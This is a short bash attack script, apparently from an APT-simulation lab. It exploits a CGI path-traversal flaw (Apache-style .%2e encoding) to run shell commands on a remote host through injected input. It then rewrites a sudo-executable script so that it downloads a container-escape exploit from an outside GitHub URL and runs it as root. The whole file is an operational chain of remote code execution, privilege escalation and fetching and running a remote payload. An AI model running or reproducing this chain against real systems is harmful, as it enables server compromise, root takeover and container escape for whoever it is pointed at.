#!/bin/bash
# IP:PORT pair for the remote host
host='localhost:3000'
# Path to the script which the daemon user can both modify and run with sudo
exploit="/usr/local/bin/vuln"

# Executes the first argument as a command on the remote host
exec () {
    curl "$host/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "A= | echo; $1"
}

# Appends first argument to the exploit script
append () {
    exec "echo '$1' >> $exploit"
}

# NOTE: we cannot use the & character in IO redirection (e.g. &>) - we must use the syntax 1>, 2>, etc
# Write the following commands to the file $exploit
exec "echo '#!/bin/bash' > $exploit"
append "apt-get update"
append "apt-get install -y wget"
append "wget -P /tmp/ https://github.com/japraj/attack-apt/blob/b2d14fd6db2232b09f74b4f36d84fc817811ad60/env/container-escape/exploit?raw=true"
append "chmod +x '/tmp/exploit?raw=true'"
append "/tmp/exploit?raw=true"
# Execute $exploit
exec "chmod +x $exploit"
exec "sudo $exploit 2>> /tmp/err.log 1>> /tmp/out.log"
